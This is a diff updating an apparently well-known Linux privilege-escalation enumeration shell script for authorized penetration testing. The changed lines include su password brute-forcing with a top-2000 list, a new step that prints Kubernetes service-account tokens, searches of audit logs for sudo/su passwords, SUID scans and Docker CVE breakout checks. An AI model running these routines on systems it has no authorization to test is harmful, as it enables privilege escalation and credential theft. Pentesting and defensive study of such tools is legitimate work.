@@ -1,6 +1,6 @@
 #!/bin/sh
 
-VERSION="v3.1.8"
+VERSION="v3.1.9"
 ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."
 
 ###########################################
@@ -359,7 +359,7 @@ else
   nosh_usrs=`cat /etc/passwd 2>/dev/null | grep -i -v "sh$" | sort | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/'`"ImPoSSssSiBlEee"
 fi
 knw_usrs='daemon\W|^daemon$|message\+|syslog|www|www-data|mail|noboby|Debian\-\+|rtkit|systemd\+'
-USER=`whoami`
+USER=`whoami 2>/dev/null || echo "UserUnknown"`
 if [ ! "$HOME" ]; then
   if [ -d "/Users/$USER" ]; then HOME="/Users/$USER"; #Mac home
   else HOME="/home/$USER";
@@ -394,7 +394,7 @@ PASSTRY="2000" #Default num of passwds to try (all by default)
 
 if [ "$PORTS" ] || [ "$DISCOVERY" ] || [ "$IP" ]; then MAXPATH_FIND_W="1"; fi #If Network reduce the time on this
 SEDOVERFLOW=true
-for grp in `groups $USER | cut -d ":" -f2`; do 
+for grp in `groups $USER 2>/dev/null | cut -d ":" -f2`; do 
   wgroups="$wgroups -group $grp -or "
 done
 wgroups="`echo $wgroups | sed -e 's/ -or$//'`"
@@ -519,25 +519,25 @@ print_ps (){
 }
 
 su_try_pwd (){
-  USER=$1
+  BFUSER=$1
   PASSWORDTRY=$2
-  trysu=`echo "$PASSWORDTRY" | timeout 1 su $USER -c whoami 2>/dev/null` 
+  trysu=`echo "$PASSWORDTRY" | timeout 1 su $BFUSER -c whoami 2>/dev/null` 
   if [ "$trysu" ]; then
-    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
+    echo "  You can login as $BFUSER using password: $PASSWORDTRY" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
   fi
 }
 
 su_brute_user_num (){
-  USER=$1
+  BFUSER=$1
   TRIES=$2
-  su_try_pwd $USER "" &    #Try without password
-  su_try_pwd $USER $USER & #Try username as password
-  su_try_pwd $USER `echo $USER | rev 2>/dev/null` & #Try reverse username as password
+  su_try_pwd $BFUSER "" &    #Try without password
+  su_try_pwd $BFUSER $BFUSER & #Try username as password
+  su_try_pwd $BFUSER `echo $BFUSER | rev 2>/dev/null` & #Try reverse username as password
   if [ "$PASSWORD" ]; then
-    su_try_pwd $USER $PASSWORD & #Try given password
+    su_try_pwd $BFUSER $PASSWORD & #Try given password
   fi
   for i in `seq $TRIES`; do 
-    su_try_pwd $USER `echo $top2000pwds | cut -d " " -f $i` & #Try TOP TRIES of passwords (by default 2000)
+    su_try_pwd $BFUSER `echo $top2000pwds | cut -d " " -f $i` & #Try TOP TRIES of passwords (by default 2000)
     sleep 0.007 # To not overload the system
   done
   wait
@@ -766,14 +766,14 @@ containerCheck() {
     grep -qai kubepods /proc/self/cgroup 2>/dev/null; then
 
     inContainer="1"
-    if [ "$containerType" ]; then containerType="$containerType (kubentes)"
-    else containerType="kubentes"
+    if [ "$containerType" ]; then containerType="$containerType (kubernetes)"
+    else containerType="kubernetes"
     fi
   fi
 
   # Are we inside LXC?
-  if env | grep "container=lxc" -qa || 
-      grep "/lxc/" /proc/1/cgroup -qa; then
+  if env | grep "container=lxc" -qa 2>/dev/null || 
+      grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then
     
     inContainer="1"
     containerType="lxc"
@@ -782,7 +782,7 @@ containerCheck() {
 
 inDockerGroup() {
   DOCKER_GROUP="No"
-  if groups | grep -q '\bdocker\b'; then
+  if groups 2>/dev/null | grep -q '\bdocker\b'; then
     DOCKER_GROUP="Yes"
   fi
 }
@@ -795,7 +795,7 @@ checkDockerRootless() {
 }
 
 enumerateDockerSockets() {
-  dockerVersion="Unknown"
+  dockerVersion="`echo_not_found`"
   if ! [ "$SEARCHED_DOCKER_SOCKETS" ]; then
     SEARCHED_DOCKER_SOCKETS="1"
     for dock_sock in `find / ! -path "/sys/*" -type s -name "docker.sock" -o -name "docker.socket" 2>/dev/null`; do
@@ -825,28 +825,28 @@ enumerateDockerSockets() {
 }
 
 checkDockerVersionExploits() {
-  if [ "`echo \"$dockerVersion\" | grep -i \"unknown\"`" ]; then
-    VULN_CVE_2019_13139="Unknown"
-    VULN_CVE_2019_5736="Unknown"
+  if [ "`echo \"$dockerVersion\" | grep -i \"not found\"`" ]; then
+    VULN_CVE_2019_13139="`echo_not_found`"
+    VULN_CVE_2019_5736="`echo_not_found`"
     return
   fi
 
-  VULN_CVE_2019_13139="No"
-  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
+  VULN_CVE_2019_13139="`echo_no`"
+  if [ "`echo \"$dockerVersion\" | sed 's,\.,,g'`" -lt "1895" ]; then
     VULN_CVE_2019_13139="Yes"
   fi
 
-  VULN_CVE_2019_5736="No"
-  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.3)" ]; then
+  VULN_CVE_2019_5736="`echo_no`"
+  if [ "`echo \"$dockerVersion\" | sed 's,\.,,g'`" -lt "1893" ]; then
     VULN_CVE_2019_5736="Yes"
   fi
 }
 
 checkContainerExploits() {
-  VULN_CVE_2019_5021="No"
+  VULN_CVE_2019_5021="`echo_no`"
   if [ -f "/etc/alpine-release" ]; then
     alpineVersion=$(cat /etc/alpine-release)
-    if [ "$(ver "$alpineVersion")" -ge "$(ver 3.3.0)" ] && [ "$(ver "$alpineVersion")" -le "$(ver 3.6.0)" ]; then
+    if [ "`echo \"$alpineVersion\" | sed 's,\.,,g'`" -ge "330" ] && [ "`echo \"$alpineVersion\" | sed 's,\.,,g'`" -le "360" ]; then
       VULN_CVE_2019_5021="Yes"
     fi
   fi
@@ -1261,16 +1261,16 @@ if [ "`echo $CHECKS | grep Container`" ]; then
   #If docker
   if [ "`echo \"$containerType\" | grep -i \"docker\"`" ]; then
     inDockerGroup
-    printf $Y"[+] "$GREEN"Am I inside Docker group .....$NC $DOCKER_GROUP\n" | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
+    printf $Y"[+] "$GREEN"Am I inside Docker group .......$NC $DOCKER_GROUP\n" | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
     printf $Y"[+] "$GREEN"Looking and enumerating Docker Sockets\n"$NC
     enumerateDockerSockets
-    printf $Y"[+] "$GREEN"Docker version ...............$NC $dockerVersion\n"
+    printf $Y"[+] "$GREEN"Docker version .................$NC$dockerVersion"
     checkDockerVersionExploits
-    printf $Y"[+] "$GREEN"Vulnerable to CVE-2019-5736 .. $VULN_CVE_2019_5736\n"$NC | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
-    printf $Y"[+] "$GREEN"Vulnerable to CVE-2019-13139 . $VULN_CVE_2019_13139\n"$NC | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
+    printf $Y"[+] "$GREEN"Vulnerable to CVE-2019-5736 ....$NC$VULN_CVE_2019_5736"$NC | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
+    printf $Y"[+] "$GREEN"Vulnerable to CVE-2019-13139 ...$NC$VULN_CVE_2019_13139"$NC | sed -${E} "s,Yes,${C}[1;31;103m&${C}[0m,"
     if [ "$inContainer" ]; then
       checkDockerRootless
-      printf $Y"[+] "$GREEN"Rooless Docker? .............. $DOCKER_ROOTLESS\n"$NC | sed -${E} "s,No,${C}[1;31m&${C}[0m,"
+      printf $Y"[+] "$GREEN"Rooless Docker? ................ $DOCKER_ROOTLESS\n"$NC | sed -${E} "s,No,${C}[1;31m&${C}[0m," | sed -${E} "s,Yes,${C}[1;32m&${C}[0m,"
     fi
   fi
 
@@ -1280,7 +1280,11 @@ if [ "`echo $CHECKS | grep Container`" ]; then
     printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout\n"$NC
     printf $Y"[+] "$GREEN"Container ID ...................$NC `cat /etc/hostname`\n"
     if [ "`echo \"$containerType\" | grep -i \"docker\"`" ]; then
-      printf $Y"[+] "$GREEN"Container Full ID ..............$NC `basename "$(cat /proc/1/cpuset)"`\n"
+      printf $Y"[+] "$GREEN"Container Full ID ..............$NC `basename \"$(cat /proc/1/cpuset)\"`\n"
+    fi
+    if [ "`echo \"$containerType\" | grep -i \"kubernetes\"`" ]; then
+      printf $Y"[+] "$GREEN"Kubernetes namespace ...........$NC `cat /run/secrets/kubernetes.io/serviceaccount/namespace /secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null`\n"
+      printf $Y"[+] "$GREEN"Kubernetes token ...............$NC `cat /run/secrets/kubernetes.io/serviceaccount/token /secrets/kubernetes.io/serviceaccount/token 2>/dev/null`\n"
     fi
 
     checkContainerExploits
@@ -1786,7 +1790,7 @@ if [ "`echo $CHECKS | grep UsrI`" ]; then
     no_shells="`cat /etc/passwd 2>/dev/null | grep -Ev "sh$" | cut -d ":" -f 7 | sort | uniq`"
     unexpected_shells=""
     printf "$no_shells\n" | while read f; do
-      if [ "`$f -c 'whoami' 2>/dev/null | grep \"$(whoami)\"`" ]; then 
+      if [ "`$f -c 'whoami' 2>/dev/null | grep \"$USER\"`" ]; then 
         unexpected_shells="$f\n$unexpected_shells"
       fi
     done
@@ -2796,6 +2800,9 @@ if [ "`echo $CHECKS | grep IntFiles`" ]; then
     echo_not_found "strace"
   fi
   find / -perm -4000 -type f 2>/dev/null | xargs ls -lahtr | while read s; do
+    #If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
+    if [ "`echo \"$s\" | grep -E \"^total\"`" ]; then break; fi
+    
     sname="`echo \"$s\" | awk '{print $9}'`"
     if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
       true #Don't do nothing
@@ -2854,7 +2861,9 @@ if [ "`echo $CHECKS | grep IntFiles`" ]; then
   printf $Y"[+] "$GREEN"SGID\n"$NC
   printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\n"$NC
   find / -perm -2000 -type f 2>/dev/null | xargs ls -lahtr | while read s; do
-    sname="`echo \"$s\" | awk '{print $9}'`"
+    #If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
+    if [ "`echo \"$s\" | grep -E \"^total\"`" ];then break; fi
+
     sname="`echo \"$s\" | awk '{print $9}'`"
     if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
       true #Don't do nothing
@@ -3058,7 +3067,7 @@ if [ "`echo $CHECKS | grep IntFiles`" ]; then
 
   ##-- IF) Read root dir
   printf $Y"[+] "$GREEN"Can I read root folder? .............. "$NC
-  (ls -al /root/ 2>/dev/null) || echo_no
+  (ls -al /root/ 2>/dev/null | grep -vi "total 0") || echo_no
   echo ""
   
   ##-- IF) Root files in home dirs
@@ -3292,7 +3301,7 @@ if [ "`echo $CHECKS | grep IntFiles`" ]; then
   ##-- IF) TTY passwords
   printf $Y"[+] "$GREEN"Checking for TTY (sudo/su) passwords in audit logs\n"$NC
   aureport --tty 2>/dev/null | grep -E "su |sudo " | sed -${E} "s,su|sudo,${C}[1;31m&${C}[0m,g"
-  grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${C}[1;31m&${C}[0m,g" | sed -${E} "s,data=.*,${C}[1;31m&${C}[0m,g"
+  find /var/log/ -type f -exec grep -RE 'comm="su"|comm="sudo"' '{}' \; 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${C}[1;31m&${C}[0m,g" | sed -${E} "s,data=.*,${C}[1;31m&${C}[0m,g"
   echo ""
 
   ##-- IF) IPs inside logs
